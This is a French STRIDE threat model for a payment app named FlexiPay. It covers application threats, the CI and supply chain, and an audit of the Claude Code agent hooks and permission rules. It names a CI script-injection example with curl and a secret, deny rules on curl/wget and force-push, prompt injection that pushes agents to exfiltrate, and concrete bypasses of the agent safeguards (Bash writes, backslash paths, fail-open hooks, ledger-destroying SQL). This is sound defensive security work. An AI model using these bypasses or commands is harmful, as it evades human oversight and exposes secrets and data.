# Modèle de menaces (STRIDE)
À compléter à chaque module. Légende : S usurpation · T altération · R répudiation · I fuite · D déni de service · E élévation de privilèges.

| Version | Date | Auteur | Changement |
|---|---|---|---|
| 1 | — | — | Version initiale : menaces applicatives (§1) |
| 2 | 2026-10-09 | securite (P0-S5) | Ajout §3 : chaîne de développement et d'approvisionnement (phase 0) ; constats sur les contrôles existants (§3.7) |

## 1. Menaces applicatives (version initiale)

| Actif | Menace | Type | Mesures | Spec |
|---|---|---|---|---|
| Compte employé | Vol de mot de passe temporaire envoyé par SMS/email | S | Expiration 72 h, changement forcé, notification, limitation d'essais | 01 |
| Compte employé | Bourrage d'identifiants | S | Rate limiting, verrouillage progressif, MFA/PIN | 01 |
| Session mobile | Vol de téléphone | S, I | PIN, biométrie locale, déconnexion inactivité, révocation à distance | 01, 06 |
| QR de paiement | Capture ou rejeu du QR | S, T | TTL 60 s, usage unique, liaison appareil, capture bloquée | 06 |
| Paiement | Double débit (rejeu, concurrence) | T | Idempotency-Key, verrous, contraintes | 02 |
| Paiement | Double exécution par reprise d'un bail d'idempotence expiré pendant une transaction lente (pic de midi) | T | Jeton de clôture vérifié au COMMIT, bail supérieur au délai maximal de transaction, UNIQUE composite sur `transactions` (revue P0-S6, S6-11) | 02 |
| Solde employé | Oracle de solde : le commerçant enchaîne les initiations sur un même QR en faisant varier le montant et lit le motif du refus | I | Code `PAYMENT_DECLINED` générique côté commerçant, une seule initiation par QR (S6-10) ; exposition au membre famille en attente de décision | 06, 07 |
| Compte (tous) | Énumération par les en-têtes de rate limiting ou par le temps de réponse de la connexion | I | Compteur sur l'identifiant haché, en-têtes limités à IP/route (S6-01) ; calcul Argon2id factice pour un identifiant inconnu (contrat auth) | 01 |
| Ledger | Altération des écritures par un admin ou un attaquant | T, R | Immuabilité (triggers), audit chaîné, accès DB restreint | 02 |
| Commission | Modification de taux frauduleuse | T | Double validation, historique, date d'effet, snapshot | 03 |
| RIB commerçant | Changement du RIB pour détourner les virements | T, S | Double validation, notification, délai de carence, contrôle KYB | 07, 08 |
| Données entreprise | Accès d'une société aux données d'une autre | I | RLS, tests IDOR | 01 |
| Documents KYC | Fuite de pièces d'identité | I | Chiffrement, URL signées courtes, accès journalisé | 04 |
| Import CSV | Injection de formules, fichiers piégés, doublons | T, D | Validation stricte, taille limitée, neutralisation des formules | 05 |
| API publique | Déni de service au pic de midi | D | WAF, rate limiting, mise à l'échelle, files | 02, 06 |
| Back-office | Compte administrateur compromis | E | MFA, double validation, moindre privilège, alertes | 01, 04 |
| Application mobile | Rétro-ingénierie, appareil rooté | T, E | Obfuscation, attestation, contrôles serveur | 06 |
| Règlements | Virement frauduleux | T | Contrôle RIB/KYC, double validation au-delà du seuil, rapprochement | 08 |
| Notifications | Hameçonnage imitant FlexiPay | S | Domaine dédié, SPF/DKIM/DMARC, pas de lien de connexion dans les SMS | 09 |

## 2. Principes
Moindre privilège, défense en profondeur, échec fermé (en cas de doute, refuser), le serveur ne fait jamais confiance au client.
Pour la chaîne de développement : **un contrôle qui échoue en silence n'est pas un contrôle** ; les garde-fous des agents IA (hooks) sont une aide, la barrière réelle est côté serveur (protection de branche, CI bloquante, revue humaine, rôles PostgreSQL).

---

## 3. Phase 0 – Chaîne de développement et d'approvisionnement (2026-10-09)

### 3.1 Contexte et hypothèses
- État du dépôt au 2026-10-09 : documentation et configuration des agents uniquement. **Aucun** `package.json`, `pnpm-lock.yaml`, `pubspec.yaml`, `.github/`, `docker-compose*` n'existe encore : les menaces des §3.2 à §3.6 sont donc des **exigences pour les tâches P0-B1, B4, B6, D1, M1, M3**, pas des vérifications.
- Contrôles existants réellement examinés : `.claude/settings.json`, `.claude/hooks/*`, `.gitignore`, `.gitattributes`, configuration git locale. Résultats au §3.7.
- Deux postes : PC d'entreprise (Device Guard, pnpm/Docker/Flutter indisponibles) et PC personnel (reprise de la phase 0 complète). Remote GitHub `amine2a7/Flexi`, rien de poussé.
- Agents IA (Claude Code) : lisent et écrivent le dépôt, exécutent des commandes `Bash` ; leurs transcriptions sont conservées localement.
- Colonne **État** : *À faire* (rien n'existe), *En attente d'outils* (dépend de pnpm/Docker/Flutter), *Partiel (constaté)* (existe, vérifié incomplet), *Non vérifié* (impossible à vérifier depuis ce poste). Rien n'est marqué « vérifié » sans preuve au §3.7.

### 3.2 Actifs
| ID | Actif | Propriété à protéger |
|---|---|---|
| AC-1 | Code source et historique Git | Intégrité, traçabilité |
| AC-2 | Secrets locaux de dev (`.env*`, identifiants Postgres/Redis locaux, jetons GitHub/npm, futures clés de signature mobile `*.jks`/`key.properties`) | Confidentialité |
| AC-3 | Secrets et jeton de la CI (`GITHUB_TOKEN`, futurs secrets de signature/déploiement) | Confidentialité, intégrité |
| AC-4 | Dépendances : registres npm et pub.dev, lockfiles, images Docker, actions GitHub tierces, générateurs de clients OpenAPI | Intégrité |
| AC-5 | Postes de développement et sessions d'agents IA (transcriptions incluses) | Intégrité, confidentialité |
| AC-6 | Contrôles de la chaîne : hooks `.claude/`, `settings.json`, workflows CI, protection de branche | Intégrité, disponibilité |
| AC-7 | Traces de gouvernance : revues `docs/handoff/reviews/securite-*`, `decisions.md`, `BOARD.md`, contrats | Intégrité, non-répudiation |
| AC-8 | Artefacts de build (images, APK/AAB, bundles web) — à venir | Intégrité, provenance |

### 3.3 Chaîne d'approvisionnement (npm, pub.dev, Docker, actions)
| ID | Actif | Menace (scénario) | STRIDE | Mesures attendues | État | Porteur |
|---|---|---|---|---|---|---|
| SC-1 | AC-4 | **Typosquatting** : un agent ou un développeur ajoute `nestjs-zod-valdiation` au lieu du paquet voulu ; le paquet malveillant s'exécute au `pnpm install` | T, E | Toute nouvelle dépendance justifiée dans le `[LIVRÉ]` (rôle, mainteneurs, ancienneté, téléchargements, licence) et relue par securite ; nom vérifié sur le registre ; `pnpm add` soumis à approbation humaine **sans contournement possible** (voir CF-04) | À faire | backend (B1), securite (S1) |
| SC-2 | AC-4 | **Confusion de dépendances** : les paquets internes `@flexipay/*` ne sont pas réservés sur npm ; un tiers publie `@flexipay/shared` en version supérieure, résolu à la place du paquet local | S, T | Paquets internes référencés en `workspace:*` uniquement ; scope `@flexipay` réservé sur npm ou registre de scope fixé dans `.npmrc` ; `.npmrc` sans jeton | À faire | backend (B1) |
| SC-3 | AC-4, AC-2, AC-3 | **Scripts d'installation** (`preinstall`/`postinstall`) d'une dépendance compromise qui volent `~/.npmrc`, les jetons GitHub et les `.env` du poste ou de la CI (mode opératoire des vers npm de 2025) | I, E | pnpm ≥ 10 (scripts de dépendances bloqués par défaut) avec liste blanche explicite `onlyBuiltDependencies` relue par securite ; à défaut `ignore-scripts=true` ; CI sans secret dans les jobs d'installation | À faire | backend (B1, B6) |
| SC-4 | AC-4 | **Mise à jour malveillante** d'un paquet légitime (mainteneur compromis) tirée dès sa publication | T | Lockfile commité ; `pnpm install --frozen-lockfile` en CI ; délai minimal avant adoption d'une nouvelle version (`minimumReleaseAge` si la version de pnpm le permet) ; mises à jour groupées et relues (Renovate/Dependabot) | À faire | backend (B1, B6) |
| SC-5 | AC-4 | **Lockfile altéré** dans une PR (URL de tarball ou intégrité modifiées, registre tiers) noyé dans un diff volumineux | T | Diff du lockfile relu ; contrôle CI : registre unique `registry.npmjs.org`, champs `integrity` présents ; `--frozen-lockfile` | À faire | backend (B6), securite (S3) |
| SC-6 | AC-4 | Paquets **pub.dev** (Flutter) : éditeur non vérifié, dépendance `git:` non épinglée, `pubspec.lock` absent | T | `pubspec.lock` commité pour les deux apps ; `dart pub get --enforce-lockfile` en CI ; dépendances `git:` interdites sauf `ref:` = SHA ; éditeurs vérifiés privilégiés | En attente d'outils | mobile (M1) |
| SC-7 | AC-4 | **Images Docker** à étiquette mutable (`postgres:latest`) remplacées en amont | T | Images officielles épinglées par version **et** empreinte `@sha256:` ; scan Trivy | En attente d'outils | backend (B4, B6) |
| SC-8 | AC-4, AC-3 | **Action GitHub tierce compromise** (cas `tj-actions/changed-files`, mars 2025 : étiquettes réécrites, secrets imprimés dans les logs) | I, T | Actions tierces épinglées par **SHA complet** (commentaire avec la version) ; Dependabot `github-actions` ; liste des actions autorisées dans les réglages du dépôt | À faire | backend (B6) |
| SC-9 | AC-4 | **Générateur de clients OpenAPI** (TS/Dart) compromis ou produisant du code non relu | T | Version du générateur épinglée ; génération en CI avec contrôle « pas de diff » ; code généré relu à la première génération | À faire | backend, frontend, mobile |
| SC-10 | AC-4 | Dépendances vulnérables ou abandonnées | T, D | `pnpm audit --prod` bloquant au-delà de « high », scan OSV pour pub.dev, SBOM CycloneDX (SEC-S3) | À faire | backend (B6) |

### 3.4 CI GitHub Actions
| ID | Actif | Menace (scénario) | STRIDE | Mesures attendues | État | Porteur |
|---|---|---|---|---|---|---|
| CI-1 | AC-3 | `GITHUB_TOKEN` en écriture par défaut : une étape compromise pousse sur `main` ou modifie des releases | E | `permissions: {}` au niveau du workflow, permissions minimales par job (`contents: read` ; `security-events: write` pour CodeQL seulement) ; réglage du dépôt « Read repository contents » par défaut | À faire | backend (B6) |
| CI-2 | AC-3 | **PR de fork** (« pwn request ») : `pull_request_target` ou `workflow_run` qui exécute le code de la PR avec les secrets | I, E | `pull_request_target` interdit ; PR de forks sans secrets ; approbation requise pour les contributeurs extérieurs ; dépôt privé (à confirmer) | À faire / Non vérifié (visibilité du dépôt) | backend (B6), lead |
| CI-3 | AC-3 | **Injection de script** : `run: echo "${{ github.event.pull_request.title }}"` avec un titre `"; curl … $SECRET` | E, I | Aucune expression `${{ github.event.* }}` dans `run:` ; passage par `env:` ; Semgrep/actionlint sur les workflows | À faire | backend (B6), securite (S3) |
| CI-4 | AC-3 | `actions/checkout` laisse le jeton dans `.git/config`, lu par une étape ultérieure (dépendance) | I | `persist-credentials: false` | À faire | backend (B6) |
| CI-5 | AC-3 | Secrets imprimés dans les logs (`set -x`, `echo`, erreurs d'outils) | I | Secrets uniquement dans des *environments* protégés ; pas de secret dans les jobs de PR ; pas de `set -x` ; phase 0 : **aucun secret nécessaire** (pas de déploiement) | À faire | backend (B6) |
| CI-6 | AC-1, AC-6 | **Empoisonnement du cache** (`actions/cache`) : une PR écrit un cache relu par `main` | T | Clés de cache incluant le hash du lockfile ; pas de restauration de cache dans les futurs jobs de release | À faire | backend (B6) |
| CI-7 | AC-6 | Scanners en mode non bloquant (`continue-on-error`, `|| true`) : gitleaks, audit, CodeQL passent au vert malgré un résultat | T | Tous les scans de sécurité bloquants ; seuils documentés ; exceptions tracées dans `docs/security/` | À faire | backend (B6), securite (S3) |
| CI-8 | AC-6 | Contournement des vérifications : fusion sans CI verte ni revue, ou modification du workflow dans la PR qui le désactive | T, E | Protection de `main` : PR obligatoire, checks requis, revue requise, pas de contournement par les administrateurs ; `CODEOWNERS` sur `.github/`, `.claude/`, `**/migrations/**`, `docs/security/` | Non vérifié (aucun accès aux réglages GitHub depuis ce poste) | lead / utilisateur |
| CI-9 | AC-6 | Runner auto-hébergé exécutant du code de PR | E | Runners hébergés par GitHub uniquement en phase 0 | À faire | backend (B6) |
| CI-10 | AC-8 | Artefacts sans provenance (APK, images) substitués avant publication | T | Attestations de provenance des artefacts (phases ultérieures) ; signature mobile hors CI de PR | À faire (hors phase 0) | backend, mobile |

### 3.5 Environnement de dev et agents IA
| ID | Actif | Menace (scénario) | STRIDE | Mesures attendues | État | Porteur |
|---|---|---|---|---|---|---|
| DEV-1 | AC-2 | Un agent lit un `.env` et recopie un secret dans un fichier, une revue ou un message | I | Règles `deny Read(./.env*)` (constat : effectives aussi sur `cat` via Bash, §3.7 P-1) ; `.gitignore` ; `protect-files.sh` (partiel, CF-01) ; aucun secret réel sur les postes de dev (secrets de dev générés, sans valeur hors du poste) | Partiel (constaté) | lead |
| DEV-2 | AC-6 | **Contournement des périmètres par Bash** (`sed -i`, redirection `>`, `node -e "fs.writeFileSync…"`) : un agent modifie un fichier hors de son périmètre, y compris `.claude/hooks/` pour désactiver un contrôle | T, E | Limite connue (README §5). Compensation : revue humaine des diffs, `CODEOWNERS` sur `.claude/`, contrôle CI que `.claude/` n'est modifié que dans des PR dédiées | Partiel (limite assumée) | lead |
| DEV-3 | AC-5 | **Injection de prompt** via un contenu non fiable (README de dépendance, message d'erreur, fichier téléchargé, contrat) qui pousse un agent à exécuter `pnpm dlx <paquet>`, à pousser ou à exfiltrer | E, I | `curl`/`wget` refusés, `git push` soumis à approbation (constaté) ; aucun agent n'a l'outil WebFetch (constaté dans `.claude/agents/*.md`) ; **ajout de dépendance contournable** (CF-04) | Partiel (constaté) | lead |
| DEV-4 | AC-6 | **Contrôles qui échouent en silence** : gitleaks absent → commit sans scan ; `agent_type` absent ou JSON invalide → `enforce-scope` laisse passer | T | Échec fermé, ou avertissement visible ; gitleaks installé sur chaque poste et **toujours** en CI | Partiel (constaté, CF-02, CF-05) | lead |
| DEV-5 | AC-7 | **Altération des traces de revue** : un agent autre que securite réécrit un verdict `BLOQUANT` en `OK` dans `reviews/securite-*`, ou securite modifie un contrat de backend | T, R | Périmètres disjoints par préfixe de fichier (CF-03) ; historique git ; verdict aussi transmis par message au lead | Partiel (constaté, CF-03) | lead |
| DEV-6 | AC-1, AC-6 | Un sous-agent « lecture seule » (`ledger-auditor`) dispose de `Bash` et peut donc écrire | T | Retirer `Bash` ou le restreindre à des commandes de lecture ; sinon accepter le risque par écrit | Partiel (constaté, CF-07) | lead |
| DEV-7 | AC-5, AC-2 | Poste personnel perdu, volé ou partagé : dépôt, jetons GitHub, transcriptions d'agents exposés | I | Chiffrement du disque, session verrouillée, jeton GitHub à portée fine et à expiration, gestionnaire d'identifiants de l'OS, aucun secret de production sur un poste | Non vérifié (poste non accessible) | utilisateur |
| DEV-8 | AC-5 | **Données personnelles réelles** (dumps, CSV d'employés) introduites en dev puis envoyées au fournisseur du modèle IA ou commises | I | Données de dev et de test **synthétiques** uniquement ; interdiction écrite d'importer des données réelles hors production (INPDP) | À faire (règle à écrire) | lead / utilisateur |
| DEV-9 | AC-5 | Secret affiché dans une sortie de commande, conservé dans les transcriptions locales des agents | I | Ne jamais afficher de variable d'environnement ; rotation si un secret apparaît dans une transcription | À faire | tous |
| DEV-10 | AC-1, AC-7 | **Répudiation** : tous les commits portent l'identité de l'utilisateur, quel que soit l'agent auteur | R | Trailer de commit indiquant l'agent ; transcriptions conservées pendant la phase ; rapports (j) | À faire | lead |
| DEV-11 | AC-6 | `format.sh` exécute `prettier` depuis `node_modules` à chaque écriture ; `task-completed.js` exécute les scripts `package.json` : une dépendance ou un script piégé s'exécute automatiquement sur le poste | E | Dépend de SC-1 à SC-4 ; scripts `package.json` relus comme du code | À faire | backend, securite |

### 3.6 Dépôt Git et Docker Compose de dev
| ID | Actif | Menace (scénario) | STRIDE | Mesures attendues | État | Porteur |
|---|---|---|---|---|---|---|
| GIT-1 | AC-2, AC-1 | **Secret commis** puis poussé (jeton, clé, mot de passe) | I | gitleaks avant commit (hook inactif sur ce poste, CF-02) ; gitleaks sur tout l'historique en CI ; *secret scanning* et *push protection* GitHub ; rotation immédiate (plan d'incident) | Partiel (constaté) / Non vérifié côté GitHub | lead, backend (B6) |
| GIT-2 | AC-1 | **Poussée directe ou forcée sur `main`**, réécriture de l'historique | T, R | `deny` sur `git push --force*` et `git push * main*`, `ask` sur `git push *` (constaté) ; protection de branche GitHub (non vérifiée) | Partiel (constaté) / Non vérifié | lead / utilisateur |
| GIT-3 | AC-1 | **Usurpation d'auteur** : commit avec une identité falsifiée | S, R | Commits signés (SSH ou GPG) et « signatures requises » sur `main` (Should) ; constat : commits actuels non signés | Partiel (constaté, CF-08) | utilisateur |
| GIT-4 | AC-2 | **Clé de signature Android** (`*.jks`, `*.keystore`, `key.properties`) ou fichiers de configuration de services commis : permet de publier une mise à jour malveillante de l'app | I, S | Motifs à ajouter au `.gitignore` (CF-06) ; clés de signature hors dépôt (gestionnaire de secrets / CI protégée) | Partiel (constaté, CF-06) | lead (propriétaire de `.gitignore`), mobile |
| GIT-5 | AC-1 | **Modification d'une migration existante** (règle 17) passant le hook sous Windows | T | Hook corrigé (CF-01) ; contrôle CI : aucune migration présente sur `main` ne doit changer dans une PR | Partiel (constaté) | lead, backend (B6) |
| GIT-6 | AC-1 | Caractères Unicode bidirectionnels ou invisibles (« Trojan Source ») dans le code ou les docs | T | Règle de lint / CodeQL ; `.gitattributes` `eol=lf` (présent) | À faire | backend (B1) |
| DC-1 | AC-2, AC-5 | Postgres (5432) et Redis (6379) publiés sur `0.0.0.0` : accessibles depuis le Wi-Fi du poste personnel | I, T | Ports liés à `127.0.0.1` uniquement | En attente d'outils | backend (B4) |
| DC-2 | AC-2 | Identifiants en dur dans `docker-compose.yml` (`POSTGRES_PASSWORD=postgres`), Redis sans mot de passe, réutilisés plus tard en staging | I | Valeurs lues depuis un `.env` non commité (modèle dans `.env.example`, sans valeur réelle) ; jamais réutilisées hors dev | En attente d'outils | backend (B4) |
| DC-3 | AC-4 | Images non épinglées (voir SC-7) | T | Version + `@sha256:` | En attente d'outils | backend (B4) |
| DC-4 | AC-5 | Socket Docker monté dans un conteneur, conteneur `privileged`, `network_mode: host` | E | Interdits dans Compose ; Testcontainers s'exécute côté hôte | En attente d'outils | backend (B4) |
| DC-5 | AC-1 | **RLS contournée en dev et en test** : l'API et les tests se connectent avec le superutilisateur ou le propriétaire des tables, qui ignorent la RLS ; les tests IDOR passent à tort | E, I | Rôle applicatif dédié, non propriétaire, `NOSUPERUSER NOBYPASSRLS` ; `FORCE ROW LEVEL SECURITY` sur les tables métier ; tests Testcontainers avec ce rôle | En attente d'outils | backend (B4, puis phase 1) |
| DC-6 | AC-5 | Données réelles dans les volumes de dev | I | Voir DEV-8 : jeux de données synthétiques | À faire | backend |

### 3.7 Constats sur les contrôles existants (vérifiés le 2026-10-09)
Méthode : lecture de `.claude/settings.json` et `.claude/hooks/*`, puis exécution des hooks avec des entrées JSON simulées (procédure README §14), y compris des cas de contournement. Les constats concernent des fichiers du lead (`.claude/`, `.gitignore`) : transmis à `main`.

Preuves positives (contrôles qui fonctionnent) :
- **P-1** `cat .env.example` via Bash refusé par la règle `deny Read(./.env.*)` : les règles de lecture s'appliquent aussi aux lectures par Bash. Effet de bord : `.env.example` n'est pas relisible par securite.
- **P-2** `enforce-scope.js` : bloque `securite` → `apps/api/x.ts` (2), autorise `docs/security/x.md` (0), bloque la traversée `docs/security/../../apps/api/x.ts` (2), bloque `.claude/settings.local.json` et un chemin hors projet (2), insensible à la casse sous Windows (2 sur `DOCS/HANDOFF/BOARD.MD`), gère les chemins à antislashs.
- **P-3** `guard-bash.sh` bloque `UPDATE ledger_entries …` (2) ; il a bloqué une commande de test de securite contenant ce motif.
- **P-4** `.gitignore` couvre `.env`, `.env.*` (sauf `.env.example`), `secrets/`, `*.pem`, `*.key`, `.claude/settings.local.json` ; `.gitattributes` impose `eol=lf`.

| ID | Sévérité | Constat | Preuve |
|---|---|---|---|
| CF-01 | Moyenne | `protect-files.sh` ne reconnaît que les séparateurs `/` : un chemin Windows à antislashs vers `secrets\` ou `…\prisma\migrations\…` n'est pas bloqué ; `secrets/x` relatif non plus ; casse (`.ENV`, `*.PEM`) non gérée alors que NTFS y est insensible | `protect-files.sh:10,16` ; entrée `c:\…\flexipay\secrets\db.txt` → code 0 ; `secrets/db.txt` → 0 ; `.ENV` → 0 ; `certs/server.PEM` → 0 (`*.env` et `*.key` à antislashs → 2) |
| CF-02 | Moyenne | `guard-bash.sh` laisse passer `git commit` sans scan quand gitleaks est absent (échec ouvert, sans avertissement) ; gitleaks absent de ce poste ; `git commit *` autorisé sans approbation | `guard-bash.sh:8` ; `command -v gitleaks` → vide ; entrée `git commit -m x` → code 0 |
| CF-03 | Moyenne | Périmètres qui se chevauchent : `securite` peut écrire `docs/handoff/contracts/` (propriété de backend) ; `design` peut écrire `docs/handoff/reviews/securite-*` (verdicts de securite) | `scopes.js:24,29` ; `securite` → `docs/handoff/contracts/openapi.yaml` : 0 ; `design` → `docs/handoff/reviews/securite-p0-b5-contrat-2026-10-09.md` : 0 |
| CF-04 | Moyenne | L'approbation humaine des nouvelles dépendances est contournable : `allow Bash(pnpm *)` couvre `pnpm --filter api add <pkg>`, `pnpm -C apps/api add <pkg>` et `pnpm dlx <pkg>` (téléchargement et exécution), que le motif `ask Bash(pnpm add *)` ne capture pas | `settings.json:7,22` (lecture ; non exécuté : pnpm indisponible) |
| CF-05 | Basse | `enforce-scope.js` laisse passer (échec ouvert) si `agent_type`/`teammate_name` est absent ou si l'entrée n'est pas un JSON valide. En conditions réelles, `agent_type` **est** transmis pour les coéquipiers : selon le lead, le test volontaire de `design` (Write vers `apps/_scope-test/design.md`) a été bloqué avec le message du hook, sans création de fichier. Élément rapporté par le lead, non reproduit par securite (mes sondes Edit échouent avant le hook) | `enforce-scope.js:10-12` ; entrée sans `agent_type` → 0 ; `not json` → 0 |
| CF-06 | Moyenne | `.gitignore` ne couvre pas les secrets mobiles et assimilés à venir : `*.jks`, `*.keystore`, `key.properties`, `*.p12`, `*.mobileprovision`, `google-services.json`/`GoogleService-Info.plist` (à arbitrer), `.npmrc` avec jeton, `*.tfstate` | `.gitignore` (11 lignes) |
| CF-07 | Basse | `ledger-auditor`, décrit « lecture seule », dispose de `Bash` (donc d'écriture non interceptée) | `.claude/agents/ledger-auditor.md` (en-tête `tools`) |
| CF-08 | Basse | Commits non signés ; pas de politique de signature | `git log --format=%G?` → `N` sur `0219ad1`, `d0bbb3f` |
| CF-09 | Basse | `guard-bash.sh` : motif de protection du ledger facile à contourner (`TRUNCATE TABLE ledger_entries`, `DROP TABLE IF EXISTS audit_log`, identifiants entre guillemets, `ALTER TABLE … DISABLE TRIGGER`) ; à considérer comme aide, la barrière réelle doit être les triggers et les rôles PostgreSQL (SEC-P4) | `guard-bash.sh:16` ; ces 4 entrées → code 0 |

Correctifs proposés (au lead, propriétaire de `.claude/` et `.gitignore`) :
- CF-01 : normaliser le chemin (`\` → `/`, minuscules) avant le `case`, et ajouter les motifs racine (`secrets/*`) ; ou porter `protect-files` en Node en réutilisant la normalisation d'`enforce-scope.js`. Ajouter un contrôle CI sur les migrations (GIT-5).
- CF-02 : échec fermé (refuser le commit si gitleaks est absent) ou au minimum message bloquant explicite ; installer gitleaks sur le poste personnel ; gitleaks obligatoire en CI (B6).
- CF-03 : préfixes disjoints : `securite` → `docs/security/`, `docs/handoff/reviews/securite-`, `docs/handoff/` hors `contracts/` ; `design` → `docs/handoff/reviews/design-`.
- CF-04 : passer en `ask` : `Bash(pnpm * add *)`, `Bash(pnpm dlx *)`, `Bash(pnpm * dlx *)`, `Bash(npx *)` (hors `npx prettier`), `Bash(pnpm install *)` avec argument ; garder la revue securite de chaque nouvelle dépendance (SC-1).
- CF-05 : journaliser (stderr) quand `agent_type` est absent pour un appel venant d'un coéquipier ; refaire le test de blocage réel (comme celui de `design`) à chaque reprise sur un nouveau poste (README §14).

État au 2026-10-09 (message du lead) : CF-01 à CF-09 **ouverts**, transmis à l'utilisateur (modification des configurations `.claude/`, `settings.json`, `.gitignore` réservée à sa décision) ; non bloquants pour la phase. `.env.example` : relu et commité par l'utilisateur lui-même.
- CF-06 : ajouter les motifs listés ; décider pour `google-services.json` (non secret au sens strict, mais à ne pas publier par défaut).
- CF-07 : retirer `Bash` de `ledger-auditor` ou documenter le risque accepté.
- CF-08 : signature SSH des commits et exigence sur `main` (Should, avant la phase 1).
- CF-09 : élargir le motif (`truncate( table)?`, `drop table( if exists)?`, `alter table … disable trigger`, guillemets) en le présentant comme aide.
